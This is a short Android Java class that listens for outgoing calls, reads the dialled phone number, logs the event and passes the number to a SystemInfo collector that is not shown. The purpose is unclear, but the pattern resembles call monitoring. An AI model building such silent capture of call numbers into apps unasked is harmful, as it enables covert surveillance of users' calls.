package com.example.eldar.parse;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created by Eldar on 20.09.2015.
 */
public class OutgoingCallReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("Blin", "Outgoing call started");
        String phoneNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
        SystemInfo.getSystemInfo(context, "out_call" + phoneNumber);
    }
}
